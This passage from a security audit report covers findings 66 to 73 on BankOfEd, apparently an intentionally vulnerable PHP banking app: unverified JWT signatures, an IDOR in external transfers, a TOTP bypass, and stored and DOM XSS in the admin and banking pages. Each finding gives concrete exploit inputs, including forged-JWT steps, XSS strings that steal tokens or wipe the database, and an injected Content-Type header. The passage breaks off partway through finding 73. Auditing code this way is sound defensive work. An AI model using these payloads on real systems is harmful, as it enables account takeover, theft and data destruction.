        'jwt_secret'  => $config['jwt_secret'],
        'environment' => getenv('APP_ENV') ?: 'production',
    ]);
}

$r->addRoute('GET', '/api/health', ['handler' => [self::class, 'health'], 'auth' => false]);
```

## 66. Customer JWT signatures are never verified — AuthMiddleware treats the unverified payload sub as the authenticated user id.

- Lead reference: ENCX-066
- Category: A02
- Severity: HIGH
- Confidence: 98%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/AuthService.php:50
- Fingerprint: 08952da2ddbadc4d14beaa4a2c06fe4dc2b980b8d17ef970e5840d57987a7870

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Middleware/AuthMiddleware.php",
  "line": 21,
  "symbol": "AuthMiddleware::handle",
  "input": "HTTP Authorization Bearer JWT"
}
```

#### Controls encountered

```
[
  "Bearer Authorization header format check (attacker-supplied)",
  "exp claim must be in the future (attacker-set)",
  "jti revocation lookup after decode (unused attacker jti is not revoked)",
  "User::findById must return a row (sequential seed ids 1-10 exist)"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Services/AuthService.php",
  "line": 58,
  "symbol": "decodeToken",
  "operation": "unverified JWT payload accepted as identity"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Customer routes with auth => true enter AuthMiddleware::handle",
    "handle() treats decodeToken's unverified payload.sub as the authenticated user id and loads User::findById",
    "No later controller re-verifies the HMAC; the bound user is used for transfers, address-book, transactions, insurance SSO"
  ],
  "impact": "Forged unsigned JWTs are accepted as login: full customer API access as any existing sub.",
  "severity_reasoning": "High: the middleware identity-binding step is the distinct root cause — it promotes an unverified sub to a session user.",
  "dynamic_test": "Send GET /api/accounts with Bearer header.payload.sig where payload.sub=1, exp future, jti unique, and signature is 'x'. Confirm 200 with user 1 accounts. A token with only two parts or expired exp should still 401, showing those checks exist but HMAC does not."
}
```

#### Validator reasoning

Confirmed: customer AuthMiddleware never verifies JWT signatures and treats the unverified payload `sub` as the authenticated user id.

Source: HTTP Authorization Bearer token is extracted in AuthMiddleware::handle() (BankOfEd-main/src/Middleware/AuthMiddleware.php:13-22). Router::dispatch() invokes this middleware for every route with `'auth' => true` (Router.php:111-113), including GET /api/profile, GET /api/accounts, POST /api/transfers/own, POST /api/transfers/external, GET /api/transactions, GET /api/insurance/sso, and address-book mutations.

Broken verification: AuthService::decodeToken() (AuthService.php:50-66) splits on '.', base64-decodes part[1], json_decodes it, and returns the payload if `exp` is in the future. It never HMAC-checks part[2], never loads jwt_secret, and never calls Firebase\JWT\JWT::decode — even though createToken() signs with JWT::encode(..., jwt_secret, HS256) and AdminAuthMiddleware correctly uses JWT::decode + Key. The source comment states this explicitly: "Decode token payload without strict signature verification." firebase/php-jwt is a composer dependency and is used correctly on the admin path, so this is an implementation defect, not a missing library.

Identity sink: AuthMiddleware then does User::findById($payload->sub) and returns that row as `$auth['user']` (AuthMiddleware.php:32-40). Controllers consume that object as the session identity:
- ProfileController::show returns User::toPublic($auth['user'])
- AccountController::index lists Account::findByUser((int)$auth['user']['id'])
- TransferService::transferOwn/transferExternal debit accounts belonging to $auth['user']
- InsuranceController::ssoUrl/ssoRedirect mint SSO URLs for $auth['user']

Attack: mint any three-part JWT, e.g. header `{"alg":"HS256","typ":"JWT"}`, payload `{"sub":1,"exp":9999999999,"jti":"forged"}`, signature arbitrary. Send `Authorization: Bearer <token>` to GET /api/profile (or any auth=true banking route). Seed data has users 1–10 with real accounts, so `sub` enumeration is trivial. Signature bytes are ignored.

Existing controls do not block: Bearer format is attacker-controlled; exp is attacker-set; jti revocation only rejects previously logged-out tokens, so a fresh unused jti passes; findById only requires a real user id. No later JWT::decode, issuer check, or signature check exists on the customer path. Unauthenticated.

#### Code evidence

```
public static function decodeToken(string $token): ?object
{
    try {
        // Decode token payload without strict signature verification
        $parts = explode('.', $token);
        if (count($parts) !== 3) {
            return null;
        }
        $payload = json_decode(base64_decode(strtr($parts[1], '-_', '+')));
        if (!$payload || !isset($payload->exp) || $payload->exp < time()) {
            return null;
        }
        return $payload;
    } catch (\Exception $e) {
        return null;
    }
}
```

## 67. External transfers debit any source account without ownership check — Balance is then updated on that unscope-checked account id.

- Lead reference: ENCX-067
- Category: A01
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/TransferService.php:174
- Fingerprint: 78ee304c15647036b113781bcaf8837a104e36f1b1fb11e8392d0bb3a4b140d1

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 110,
  "symbol": "transferExternal",
  "input": "JSON from_account_id"
}
```

#### Controls encountered

```
[
  "Bearer auth required (AuthMiddleware) — authenticates caller, does not bind from_account_id to that user",
  "Address-book payees scoped via findByIdAndUser — only constrains destination for address_book path, not source ownership",
  "Optional TOTP on manual/unverified payees — verifies caller TOTP and is bypassed when totp is unset or the code is omitted"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Services/TransferService.php",
  "line": 174,
  "symbol": "Account::findById",
  "operation": "debit source account without ownership check"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "POST /api/transfers/external with attacker-chosen from_account_id after any customer auth",
    "TransferService::transferExternal uses Account::findById (no user scope)",
    "Account::updateBalance($fromAccountId, '-' . $debitAmount) then writes the debit on that unscope-checked id — this balance update is the distinct sink"
  ],
  "impact": "Unauthorized debit of any account id, crediting an attacker payee.",
  "severity_reasoning": "High: the privilege failure is the unscope-checked UPDATE of balances, not merely the lookup.",
  "dynamic_test": "As user 2, external-transfer from_account_id=1 amount 25 to attacker BSB. Confirm 201, new_from_balance dropped on account 1, and a transactions row with from_account_id=1. Verify user 2's own accounts were not the source."
}
```

#### Validator reasoning

POST /api/transfers/external is a live authenticated route (Router.php) that passes the JSON `from_account_id` straight into TransferService::transferExternal. That method loads the source with Account::findById() (SELECT * FROM accounts WHERE id = ?) and never compares account.user_id to the caller. Contrast transferOwn, which correctly uses findByIdAndUser. After payee resolution, Account::updateBalance($fromAccountId, '-' . $debitAmount) debits that unscope-checked row, and a matching internal BSB/account number is credited. Manual transfers take attacker-controlled to_bsb/to_account_number; address-book payees are only scoped to the attacker, not the victim. Auth and TOTP do not bind the source account to the caller, and TOTP is skippable when unset or omitted. Concrete source-to-sink IDOR with no effective ownership control.

#### Code evidence

```
// VULNERABILITY #23: IDOR - no ownership check on source account.
// Any authenticated user can supply any account ID as the source.
$fromAccount = Account::findById($fromAccountId);
if (!$fromAccount) {
    Response::notFound('Source account not found.');
}
```

## 68. TOTP step-up on external transfers can be skipped — Users without TOTP enrolled are allowed to complete high-risk external transfers

- Lead reference: ENCX-068
- Category: A07
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/TransferService.php:234
- Fingerprint: 6402558bcb67376bc7dd246a21ec4f10373ffc769a45f94a71917874dfea3b71

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 120,
  "symbol": "transferExternal",
  "input": "JSON totp_code"
}
```

#### Controls encountered

```
[
  "AuthMiddleware JWT on POST /api/transfers/external (session only; login has no TOTP challenge)",
  "TransferService::checkTotpRequired consulted for manual and first-time address-book transfers",
  "Frontend ext-totp-warning / disabled Pay button when requires_totp && !totp_configured (client-side only)",
  "TotpService::verify only runs when totp_enabled is true AND totp_code is non-empty"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Services/TransferService.php",
  "line": 237,
  "symbol": "transferExternal",
  "operation": "TOTP required path continues without verification"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "POST /api/transfers/external classified as manual or first-time address-book (checkTotpRequired required=true)",
    "If the user has not enrolled TOTP, the handler explicitly allows completion with totpVerified=false — distinct root cause vs omitting a code on an enrolled user",
    "Transfer still calls updateBalance and Transaction::create"
  ],
  "impact": "High-risk external payments complete without 2FA for any user who never enrolled TOTP, including forged-JWT sessions.",
  "severity_reasoning": "High: enrollment is optional and non-enrollment is treated as authorization to skip step-up on money movement.",
  "dynamic_test": "Pick a seeded user with totp_enabled=0 (default). POST /api/transfers/external manual payee with no totp_code. Confirm 201 and totp_verified=false. Optionally enable TOTP via /api/profile/totp/* and show that enrolled users who send a wrong code are blocked, isolating the unenrolled-allow path."
}
```

#### Validator reasoning

Confirmed. POST /api/transfers/external is auth-gated only (JWT). TransactionController::transferExternal does not require totp_code and forwards it as optional into TransferService::transferExternal. checkTotpRequired returns required=true for every manual external transfer and for first-time (unverified) address-book payees. On that required path, if the user has totp_enabled=0 (schema default; registration never enrolls TOTP; seeded users are unenrolled), the service explicitly continues, sets totp_verified=false, debits the source account, and inserts a completed transaction. No later server-side gate blocks completion.

This is a policy/control failure, not optional-2FA-by-design: the same service advertises requires_totp via POST /api/transfers/check, and the SPA hides submit and tells the user they must enable 2FA first. That UI is not a security control; a stolen or forged session can call the API directly and move funds to a new payee with no step-up.

Distinct from the sibling omit-code-when-enrolled bug (elseif !empty($totpCode) fall-through). This verdict is only the unenrolled-user skip.

#### Code evidence

```
// VULNERABILITY #8: TOTP Bypass — if TOTP is required but not configured, transfer proceeds anyway.
// Additionally, if configured but code is omitted, transfer still succeeds.
if ($totpCheck['required']) {
    if (!$user['totp_enabled']) {
        // Allow transfer to proceed without TOTP if user hasn't configured it
        $totpVerified = false;
    } elseif (!empty($totpCode)) {
        if (!TotpService::verify($user['totp_secret'], $totpCode, $user['email'])) {
            Response::forbidden('TOTP_INVALID', 'Invalid TOTP code. Please try again.');
        }
        $totpVerified = true;
    }
}
```

## 69. Stored XSS in admin customer Delete handler via HTML-entity decoding — Registration and profile update accept arbitrary first_name/last_name with no sa

- Lead reference: ENCX-069
- Category: A03
- Severity: MEDIUM
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/admin/js/pages/customers.js:107
- Fingerprint: b184f9425e635da5b2c6b57aa93c97c57ef1c69b0af4ee94588ff90ede5bcf75

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AuthController.php",
  "line": 31,
  "symbol": "User::create",
  "input": "first_name/last_name from POST /api/auth/register JSON body"
}
```

#### Controls encountered

```
[
  "BankOfEdAdmin.Utils.escapeHtml encodes ' to &#39; (HTML context only; decoded inside event-handler JS)",
  "replace(/'/g, \"\\\\'\") after HTML encoding never sees a raw quote and is a no-op",
  "Validator first_name/last_name: required|string|max:100 with no charset/HTML/quote restriction",
  "User::create / User::update persist names via parameterized SQL with no sanitization",
  "json_encode default flags leave single quotes intact",
  "No Content-Security-Policy on admin index.html, .htaccess, or PHP responses"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/admin/js/pages/customers.js",
  "line": 107,
  "symbol": "confirmDelete onclick / innerHTML",
  "operation": "HTML output into JS string context"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Trigger requires an administrator to open the attacker’s customer-detail page and click Delete (realistic stored-XSS interaction, not a blocking control)",
  "Not dynamically executed in a live browser in this review; confirmation is from source-to-sink inspection plus HTML event-handler attribute parsing rules"
]
```

#### Attack path

```
{
  "nodes": [
    "Public POST /api/auth/register or PUT /api/profile accepts first_name/last_name as required|string|max:100 with no charset, quote, or HTML neutralization",
    "User::create/update persist the raw payload in VARCHAR(100) via parameterized SQL (preserves metacharacters)",
    "Admin GET /api/admin/customers/{id} json_encodes names without JSON_HEX_APOS",
    "customers.js interpolates the stored name into confirmDelete onclick after escapeHtml; HTML decoding reconstitutes '",
    "Admin clicks Delete; attacker JS runs with admin token access"
  ],
  "impact": "Input-layer stored XSS: unsanitized registration/profile names become executable admin-origin script on Delete, enabling admin token theft and database wipe/password reset/balance changes.",
  "severity_reasoning": "Distinct root cause is the missing input neutralization on first_name/last_name (only type/length). Combined with the onclick encoding bug this is a complete stored XSS. Medium because trigger is click-gated on customer detail.",
  "dynamic_test": "POST /api/auth/register last_name `');BankOfEdAdmin.Api.resetDatabase();//` (or a shorter token-exfil payload). Confirm the stored users.last_name still contains the quote. As admin, open the customer and click Delete; confirm JS runs. Also PUT /api/profile to overwrite names the same way."
}
```

#### Validator reasoning

Public registration and authenticated profile update persist attacker-controlled first_name/last_name with only type/length checks (string, max 100). Those values are returned raw on GET /api/admin/customers/{id} and interpolated into an onclick JavaScript string on the admin customer-detail page. escapeHtml() turns ' into &#39; before replace(/'/g) runs, so the JS-string escape is a no-op. The HTML parser then decodes &#39; back to a quote in the event-handler source, breaking out of the single-quoted argument when an admin clicks Delete. There is no CSP, no input sanitization of quotes/HTML, and the admin SPA stores its bearer token in localStorage on the same origin, so the resulting script runs with full admin API access (password reset, balance changes, FX rates, database wipe via BankOfEdAdmin.Api.resetDatabase()).

Concrete path:
1. POST /api/auth/register (public; Router.php auth=>false) with last_name = "');BankOfEdAdmin.Api.resetDatabase();//" (or PUT /api/profile after login). Validator::validateString/validateMax allow any 100-char string; User::create/User::update store it verbatim in VARCHAR(100).
2. AdminUserController::show returns first_name/last_name via json_encode (default flags; single quotes are not escaped).
3. BankOfEdAdmin.Router /customers/:id → CustomersPage.showDetail → renderDetail assigns innerHTML containing:
   onclick="BankOfEdAdmin.CustomersPage.confirmDelete(" + c.id + ", '" + U.escapeHtml(name).replace(/'/g,"\\'") + "')"
4. Resulting markup is onclick="…confirmDelete(ID, 'Alice &#39;);BankOfEdAdmin.Api.resetDatabase();//')". Attribute parsing decodes &#39; to ', so the click handler is confirmDelete(ID, 'Alice ');BankOfEdAdmin.Api.resetDatabase();//').
5. Clicking the visible Delete button executes attacker JS in the admin origin.

Ineffective controls: HTML-entity encoding of quotes (wrong context), post-encode replace(/'/g) (never sees a raw quote), max:100 (payload fits; first+last can also be split). No DOMPurify/Trusted Types. innerHTML does install event-handler content attributes (unlike <script> tags). Exploitation requires an admin to open that customer and click Delete; that is interaction for stored XSS, not a blocking control.

#### Code evidence

```
Admin render (customers.js):
button onclick="BankOfEdAdmin.CustomersPage.confirmDelete(' + c.id + ', \'' + U.escapeHtml(c.first_name + ' ' + c.last_name).replace(/'/g, "\\'") + '\')"

escapeHtml maps ' to &#39;, so replace(/'/g) never sees a raw quote. The HTML parser then decodes &#39; back to ' before executing onclick.

Customer source (AuthController::register / ProfileController::update) accepts first_name/last_name as unconstrained strings (max 100), e.g. last_name = "');fetch('/api/admin/system/reset',{method:'POST',headers:{'Content-Type':'application/json','Authorization':'Bearer '+localStorage.getItem('bankofed_admin_token')},body:'{\"confirm\":\"RESET\"}'});//"
```

## 70. Stored XSS in admin accounts table via account_name onclick — POST /api/accounts stores account_name with only required|string|max:100 and no

- Lead reference: ENCX-070
- Category: A03
- Severity: HIGH
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/admin/js/pages/accounts.js:54
- Fingerprint: 268a5966d4cc3bc2b2326e3b4112fbb8fb6a32aa9c3cc5ff6c1e5b0bf55c2b64

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AccountController.php",
  "line": 28,
  "symbol": "account_name",
  "input": "JSON body account_name on POST /api/accounts"
}
```

#### Controls encountered

```
[
  "U.escapeHtml on account_name (HTML text/attribute context only; &#39; is decoded before the event handler runs)",
  "post-escape replace(/'/g, \"\\\\'\") is a no-op because quotes are already entity-encoded",
  "Validator required|string|max:100 (length only; apostrophes and JS metacharacters allowed)",
  "PDO parameterized INSERT (preserves the payload, does not neutralize it)",
  "PHP json_encode without JSON_HEX_APOS (apostrophes survive the API)",
  "deploy.sh X-XSS-Protection 1; mode=block (deprecated; not CSP; does not stop innerHTML event-handler XSS)",
  "banking UI maxlength=100 (same bound as the API; quotes still accepted)"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/admin/js/pages/accounts.js",
  "line": 54,
  "symbol": "container.innerHTML",
  "operation": "HTML output"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Authenticated POST /api/accounts stores account_name with only required|string|max:100; Validator allows quotes and JS metacharacters",
    "Account::create parameterized INSERT preserves the payload in VARCHAR(100)",
    "GET /api/admin/accounts returns account_name; json_encode does not hex-escape apostrophes",
    "accounts.js builds Edit Balance onclick with U.escapeHtml(account_name) then innerHTML",
    "HTML entity decoding restores ' and clicking Edit Balance executes attacker JS in the admin origin"
  ],
  "impact": "Stored XSS from unsanitized account_name into the admin accounts table, yielding bankofed_admin_token theft and privileged admin API access.",
  "severity_reasoning": "Distinct root cause is the account create validator (length only, no neutralization). Newest accounts sort first so the payload is on page 1. High.",
  "dynamic_test": "POST /api/accounts with account_name `');alert(document.domain)//`. GET /api/admin/accounts as admin and confirm the raw apostrophe is in JSON. Open #/accounts, click Edit Balance on that row, confirm script execution."
}
```

#### Validator reasoning

Confirmed stored XSS from customer-controlled account_name into the admin accounts table onclick handler.

Source: authenticated POST /api/accounts (Router.php) hits AccountController::store. Validation is only `required|string|max:100` — no regex, strip_tags, htmlspecialchars, or quote neutralization. Account::create binds the raw JSON body field into VARCHAR(100). json_encode in Response::success does not escape apostrophes, so GET /api/admin/accounts (AdminAccountController::index, same DB name `bankofed`) returns the payload intact.

Sink: public/admin/js/pages/accounts.js renderTable builds:
`onclick="BankOfEdAdmin.AccountsPage.showEditBalanceModal(' + a.id + ', \'' + U.escapeHtml(a.account_name).replace(/'/g, "\\'") + '\', \'' + a.balance + '\')"`
then assigns via `container.innerHTML = html` (line 54). escapeHtml maps `'` → `&#39;` *before* the replace, so the JS-string backslash never sees a raw quote. innerHTML attribute parsing then decodes `&#39;` back to `'` inside the double-quoted onclick value. A payload such as `'+alert(1)+'` or `');alert(1);//` (both ≪ 100 chars) becomes executable event-handler JS when an admin clicks the normal “Edit Balance” action on `#/accounts`.

No effective blocker: no CSP / Trusted Types; X-XSS-Protection in deploy.sh is obsolete and does not apply to script-constructed innerHTML; banking UI maxlength is not a security control and still allows `'`; admin/customer/API share origin so the handler can read localStorage `bankofed_admin_token` and call privileged /api/admin/* (setBalance, resetPassword, deleteCustomer, export). HTML-escaping of account_name in the adjacent `<span>` is a different (safe) text context and does not protect the onclick JS string.

#### Code evidence

```
accounts.forEach(function (a) {
  ...
  html += ...
    '<button onclick="BankOfEdAdmin.AccountsPage.showEditBalanceModal(' + a.id + ', \'' + U.escapeHtml(a.account_name).replace(/'/g, "\\'") + '\', \'' + a.balance + '\')" ...'
  ...
});
container.innerHTML = html;

// source: AccountController::store accepts unsanitized account_name
'account_name' => 'required|string|max:100',
...
'account_name'   => $data['account_name'],
```

## 71. Stored XSS in admin customer detail via name in Delete onclick — POST /api/auth/register stores first_name and last_name with only length checks

- Lead reference: ENCX-071
- Category: A03
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/admin/js/pages/customers.js:161
- Fingerprint: ccc0c4014970f94276490c7aba0f3f774bdf232ae819fddf7cdd9a89f3723d2c

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AuthController.php",
  "line": 19,
  "symbol": "first_name/last_name",
  "input": "JSON body first_name and last_name on POST /api/auth/register"
}
```

#### Controls encountered

```
[
  "U.escapeHtml converts apostrophe to &#39; before JS quoting, so replace(/'/g) never sees a raw quote",
  "post-escape replace(/'/g, \"\\\\'\") is ineffective against HTML-entity quotes that innerHTML later decodes",
  "escapeHtml is effective in adjacent HTML text/attribute contexts (table cells, input values) but not in this JS-in-HTML-attribute context",
  "c.id is a DB integer and is not the injection vector"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/admin/js/pages/customers.js",
  "line": 161,
  "symbol": "innerHTML",
  "operation": "HTML output"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Unauthenticated POST /api/auth/register first_name/last_name required|string|max:100; Validator has no HTML/JS neutralization",
    "User::create stores names verbatim in utf8mb4 VARCHAR(100)",
    "AdminUserController::show returns those fields; json_encode leaves apostrophes",
    "customers.js:161 innerHTML of confirmDelete onclick with HTML-escaped name; &#39; decodes to ' before JS runs",
    "Clicking Delete in admin customer-detail executes attacker script and can steal bankofed_admin_token"
  ],
  "impact": "Fully attacker-controlled stored XSS via public registration names executing in the admin origin on Delete.",
  "severity_reasoning": "Distinct root cause is registration storing unconstrained names. Source is unauthenticated, so any Internet user can plant the payload. High.",
  "dynamic_test": "POST /api/auth/register with last_name `x');alert(1);//`. As admin GET /api/admin/customers/{id} to see the apostrophe, open #/customers/{id}, click Delete, confirm alert/token exfil."
}
```

#### Validator reasoning

Unauthenticated POST /api/auth/register accepts first_name/last_name with only required|string|max:100 (AuthController.php:19–22) and stores them verbatim via User::create. Validator has no HTML/JS neutralization; users.first_name/last_name are VARCHAR(100) utf8mb4. Admin GET /api/admin/customers/{id} (AdminUserController::show) returns those fields as-is; json_encode does not escape apostrophes.

Admin SPA route /customers/:id calls CustomersPage.showDetail → renderDetail. Line 106 interpolates the names into a single-quoted JS argument inside a double-quoted onclick, then line 161 assigns the markup via innerHTML.

The attempted defenses fail by order: escapeHtml turns ' into &#39;, so the subsequent .replace(/'/g, "\\'") never sees a raw quote. innerHTML HTML-parses the attribute and decodes &#39; back to ', breaking the JS string. Example last_name `x');alert(1);//` yields onclick JS `confirmDelete(id, 'Alice x');alert(1);//'`. Clicking Delete runs attacker script in the admin origin with access to localStorage bankofed_admin_token. No CSP is present. This is a concrete stored XSS source-to-sink path with no effective blocking control.

#### Code evidence

```
'<button onclick="BankOfEdAdmin.CustomersPage.confirmDelete(' + c.id + ', \'' + U.escapeHtml(c.first_name + ' ' + c.last_name).replace(/'/g, "\\'") + '\')" class="text-sm font-medium text-red-600 ...">Delete</button>'
...
U.$('customer-detail-content').innerHTML = html;

// source: AuthController::register
'first_name' => 'required|string|max:100',
'last_name'  => 'required|string|max:100',
...
'first_name'    => $data['first_name'],
'last_name'     => $data['last_name'],
```

## 72. DOM XSS via unsanitized avatar_data in sidebar innerHTML — Server copies unsanitized remote Content-Type into avatar_data data URI

- Lead reference: ENCX-072
- Category: A03
- Severity: MEDIUM
- Confidence: 90%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/banking/js/app.js:72
- Fingerprint: a98b8e541e1ddd061417d7d984f8fccdc522f9d3c6bd972daddf1f10e6f53d31

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/ProfileController.php",
  "line": 101,
  "symbol": "avatar_data",
  "input": "Remote Content-Type header from user-supplied avatar URL"
}
```

#### Controls encountered

```
[
  "POST /api/profile/avatar requires a Bearer session (AuthMiddleware)",
  "BankOfEd.Utils.escapeHtml exists but is not applied to avatar_data or the innerHTML/jQuery .html() sinks",
  "Authorization is a localStorage Bearer token, so cross-site CSRF of the import is not automatic"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/banking/js/app.js",
  "line": 72,
  "symbol": "avatarEl.innerHTML",
  "operation": "HTML output"
}
```

#### Counterevidence

```
[
  "Login/register overwrites bankofed_user with User::toPublic(), which omits avatar_data, so the sidebar sink does not fire until the next import or profile loadAvatar re-fetch",
  "No third-party profile view renders another user's avatar_data; impact is the importing user's own authenticated origin"
]
```

#### Proof gaps

```
[
  "Victim must import (or already have stored) an attacker-controlled avatar URL; that is the designed import-avatar UX, not a separate gadget",
  "Exploitation is attribute breakout + onerror, not a <script> insertion (innerHTML does not execute inserted script tags)",
  "Remote server must emit a Content-Type containing a quote; an attacker-controlled host can do this over raw HTTP"
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated POST /api/profile/avatar with attacker-controlled url",
    "avatarProxy file_get_contents the URL; remote Content-Type copied verbatim into avatar_data data:{$mime};base64,... with no MIME allowlist or character filter",
    "JSON transport restores quotes in the MIME string",
    "App.updateSidebar innerHTML concatenates user.avatar_data into <img src=\"...\"> without escapeHtml; profile.js .html() sibling",
    "Crafted Content-Type breaks the attribute and fires onerror; avatar_data persisted in localStorage bankofed_user"
  ],
  "impact": "DOM XSS from unsanitized remote Content-Type in a data URI, persistent in the banking SPA, enabling theft of bankofed_token.",
  "severity_reasoning": "Distinct root cause is server-side MIME copy into avatar_data. Victim must import the URL (account-scoped). Medium.",
  "dynamic_test": "Serve Content-Type: image/png\\\" onerror=\\\"alert(localStorage.getItem('bankofed_token'))\\\" x=\\\". POST /api/profile/avatar with that URL. Reload banking UI; confirm sidebar img onerror and that GET /api/profile later re-imports via stored avatar_url."
}
```

#### Validator reasoning

Confirmed DOM XSS with a complete, unblocked source-to-sink path.

Source: POST /api/profile/avatar (ProfileController::avatarProxy) fetches a caller-supplied URL via file_get_contents with no allowlist. The remote Content-Type is copied verbatim (`trim(substr($header, 13))`) into `avatar_data` as `data:{$mime};base64,{$encoded}` with no MIME allowlist or character filtering.

Transport: Response::success json_encodes the payload. Quotes in the MIME string are JSON-escaped then restored by JSON.parse, so they survive into JS.

Sink: BankOfEd.App.updateSidebar interpolates user.avatar_data into innerHTML without BankOfEd.Utils.escapeHtml:
`avatarEl.innerHTML = '<img src="' + user.avatar_data + '" alt="avatar" class="w-full h-full object-cover">';`
The same construction is used in ProfilePage.renderAvatar via `$('#avatar-preview').html(...)`.

Exploit: a remote response of `Content-Type: image/png" onerror="alert(localStorage.getItem('bankofed_token'))" x="` yields
`<img src="data:image/png" onerror="alert(localStorage.getItem('bankofed_token'))" x=";base64,..." alt="avatar" ...>`.
HTML5 parses this as an img with an onerror handler. `src="data:image/png"` is not a valid image, so onerror runs in the banking origin.

Persistence: renderAvatar writes avatar_data into localStorage (`bankofed_user`); updateSidebar re-renders it on every SPA load while the session remains. avatar_url is stored in users.avatar_url and loadAvatar re-imports it on every profile visit, so the payload returns even after a login that overwrites localStorage with User::toPublic() (which has no avatar_data).

No blocking control: no CSP/meta CSP, no Trusted Types, no MIME sanitization, escapeHtml exists but is unused on this path. Auth on the endpoint only means the handler runs in an authenticated session (token in localStorage), which increases impact. Bearer-token auth blocks classic cookie CSRF of the import, but that is not required: importing an avatar URL is the intended feature, and a user pasting an attacker image URL is sufficient.

#### Code evidence

```
Client sink (app.js):
  avatarEl.innerHTML = '<img src="' + user.avatar_data + '" alt="avatar" class="w-full h-full object-cover">';
  user comes from Api.getUser() → localStorage bankofed_user, populated by ProfilePage.renderAvatar after importAvatar.

Server construction (ProfileController::avatarProxy):
  $content = @file_get_contents($data['url'], ...);  // user-controlled URL, no allowlist
  $mime = trim(substr($header, 13));                 // attacker-controlled Content-Type
  'avatar_data' => "data:{$mime};base64,{$encoded}"

Sibling: public/banking/js/pages/profile.js renderAvatar() uses $('#avatar-preview').html('<img src="' + data.avatar_data + '" ...>') and interpolates data.source_url into .html() without escaping.
```

## 73. Stored XSS via unescaped transaction description on account detail — API/transfer layer persists description/payee_name/reference with no HTML saniti

- Lead reference: ENCX-073
- Category: A03
- Severity: HIGH
- Confidence: 94%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/banking/js/pages/accounts.js:171
- Fingerprint: 12a1a845e1a7837f179d9dd5a3648751a38291e97425472c4c93186ec3e2088c

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 74,
  "symbol": "description",
  "input": "JSON body description on POST /api/transfers/own and POST /api/transfers/external"
}
```

#### Controls encountered

```
[
  "U.escapeHtml exists and is applied to adjacent fields (account_name, bsb, tx.type) but not tx.description",
  "description validation is only string|max:255 — no HTML sanitization/strip_tags",
  "No Content-Security-Policy header or meta tag",
  "json_encode without JSON_HEX_TAG/JSON_HEX_AMP",
  "PDO prepared insert preserves the payload rather than encoding it"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/banking/js/pages/accounts.js",
  "line": 171,
  "symbol": "container.innerHTML",
  "operation": "HTML output"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Payload was not executed in a live browser; confirmation relies on the documented innerHTML event-handler execution model (img onerror / svg onload), not <script> tags which innerHTML does not run."
]
```

#### Attack path

```
{
  "nodes": [
    "POST /api/transfers/own or /external accepts description string|max:255; PaymentController concatenates unsanitized payee_name/reference into the same column",
    "TransferService/Transaction::create persist description with no htmlspecialchars/strip_tags",
    "Victim GET /api/transactions?account_id= includes incoming rows (from OR to)",
    "accounts.js renderDetailTransactions concatenates tx.description into innerHTML (tx.type is escaped)",
    "No CSP; event-handler payload steals localStorage bankofed_token"
  ],
  "impact": "Cross-user stored XSS via unsanitized persisted transfer/payment descriptions rendered on the recipient's account-detail page.",
  "severity_reasoning": "Distinct root cause is persistence without HTML sanitization. Incoming credits make this cross-user. High.",
  "dynamic_test": "POST /api/transfers/external to a victim internal account with description `<img src=x onerror=alert(1)>`. As victim open account detail and confirm execution. Also POST /api/payments/transfer with a malicious payee_name/reference under the machine token."
}
```

#### Validator reasoning

